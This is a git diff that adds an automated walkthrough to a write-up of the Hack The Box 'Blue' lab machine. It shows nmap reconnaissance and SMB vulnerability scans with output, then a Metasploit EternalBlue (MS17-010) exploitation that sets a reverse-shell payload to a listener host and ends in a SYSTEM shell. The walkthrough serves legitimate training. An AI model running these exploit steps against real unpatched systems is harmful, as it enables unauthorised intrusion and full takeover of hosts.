@@ -21,6 +21,7 @@ Table o' contents:
 [pyenv Setup](#pyenv-setup)
 
 [Running The Exploits](#running-the-exploits)
+[Verbose Automation](#verbose-automation)
 
 
 # Blue
@@ -444,4 +445,222 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
+
+## Verbose Automation
+Having done the box with hands-on, generic network tools / specific exploit scripts, we can now relish in more automated testing.
+
+Pinging the Target:
+```bash
+sudo nmap $ip -n -v -oN scans/nmap/ping_check.txt -sn -PE --packet-trace
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-22 05:43 EDT
+Initiating Ping Scan at 05:43
+Scanning 10.10.10.40 [1 port]
+SENT (0.1177s) ICMP [10.10.16.4 > 10.10.10.40 Echo request (type=8/code=0) id=19205 seq=0] IP [ttl=52 id=55452 iplen=28 ]
+RCVD (0.1520s) ICMP [10.10.10.40 > 10.10.16.4 Echo reply (type=0/code=0) id=19205 seq=0] IP [ttl=127 id=311 iplen=28 ]
+Completed Ping Scan at 05:43, 0.15s elapsed (1 total hosts)
+Nmap scan report for 10.10.10.40
+Host is up (0.034s latency).
+Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
+           Raw packets sent: 1 (28B) | Rcvd: 1 (28B)
+```
+
+Discovering Gateways:
+```bash
+sudo nmap $ip -n -v -oN scans/nmap/tcp/1000_top_ports.txt -Pn --disable-arp-ping --reason -sS -O --top-ports 1000
+
+Nmap scan report for 10.10.10.40
+Host is up, received user-set (0.049s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+49152/tcp open  unknown      syn-ack ttl 127
+49153/tcp open  unknown      syn-ack ttl 127
+49154/tcp open  unknown      syn-ack ttl 127
+49155/tcp open  unknown      syn-ack ttl 127
+49156/tcp open  unknown      syn-ack ttl 127
+49157/tcp open  unknown      syn-ack ttl 127
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=7/22%OT=135%CT=1%CU=33273%PV=Y%DS=2%DC=I%G=Y%TM=687F5D
+OS:C5%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=2%ISR=109%TI=I%CI=I%II=I%SS=S%TS
+OS:=7)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=108%GCD=1%IS
+OS:R=10A%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%II=I%S
+OS:S=S%TS=7)SEQ(SP=108%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M542NW
+OS:8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M5
+OS:42ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%
+OS:T=80%W=2000%O=M542NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
+OS:T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
+OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
+OS:%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
+OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Uptime guess: 0.006 days (since Tue Jul 22 05:37:17 2025)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: Incremental
+```
+
+Server Message Block:
+```bash
+sudo nmap $ip -n -v -oN scans/nmap/tcp/microsoft-ds_version_default_script.txt -Pn --disable-arp-ping --reason -sS -sV --script=default -p 445
+
+Nmap scan report for 10.10.10.40
+Host is up, received user-set (0.034s latency).
+
+PORT    STATE SERVICE      REASON          VERSION
+445/tcp open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -19m56s, deviation: 34m36s, median: 2s
+| smb2-time: 
+|   date: 2025-07-22T14:27:20
+|_  start_date: 2025-07-22T09:37:39
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-07-22T15:27:19+01:00
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+```
+```bash
+sudo nmap $ip -n -v -oN scans/nmap/tcp/microsoft-ds_vuln_script.txt -Pn --disable-arp-ping --reason -sS -sV --script=vuln -p 445
+
+Nmap scan report for 10.10.10.40
+Host is up, received user-set (0.033s latency).
+
+PORT    STATE SERVICE      REASON          VERSION
+445/tcp open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+```
+
+Metasploit Exploitation:
+```bash
+msfconsole
+msf6 > search eternalblue
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+```
+```bash
+msf6 > use 24
+msf6 auxiliary(scanner/smb/smb_ms17_010) > options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                 Required  Description
+   ----         ---------------                                                 --------  -----------
+   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        445                                                             yes       The SMB service port (TCP)
+   SMBDomain    .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                      no        The password for the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               yes       The number of concurrent threads (max one per host)
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 10.10.10.40
+RHOST => 10.10.10.40
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+```bash
+msf6 > use 0                                                                                                         
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp                                         
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell_reverse_tcp                           
+payload => windows/x64/shell_reverse_tcp                                                                             
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options                                                             
+                                                                                                                                                                                                                                           
+Module options (exploit/windows/smb/ms17_010_eternalblue):                                                           
+                                                                                                                     
+   Name           Current Setting  Required  Description                                                             
+   ----           ---------------  --------  -----------                                                             
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl  
+                                             oit/basics/using-metasploit.html                                        
+   RPORT          445              yes       The target port (TCP)                      
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects   
+                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target                                                                                                                         
+                                             machines.                                                               
+   SMBPass                         no        (Optional) The password for the specified username                      
+   SMBUser                         no        (Optional) The username to authenticate as                              
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
+                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
+                                             ines.                                                                   
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
+                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.                                                                                                                             
+                                                                                                                     
+                                                                                                                     
+Payload options (windows/x64/shell_reverse_tcp):                                                                                                                                                                                           
+                                                                                                                     
+   Name      Current Setting  Required  Description                                                                  
+   ----      ---------------  --------  -----------                                                                  
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)                    
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)                           
+   LPORT     4444             yes       The listen port                                                              
+                                                                                                                     
+                                                                                                                     
+Exploit target:                                                                                                      
+                                                                                                                                                                                                                                           
+   Id  Name                                                                                                          
+   --  ----                                                                                                          
+   0   Automatic Target                                                                                              
+                                                                                                                     
+                                                                                                                     
+                                                                                                                     
+View the full module info with the info, or info -d command.                            
+                                                                                                                     
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.16.5                                                                                                                                                                      
+LHOST => 10.10.16.5                                                                                                  
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40                        
+RHOSTS => 10.10.10.40                                                                                                
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+-----
+          
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+```
+
+
+
 
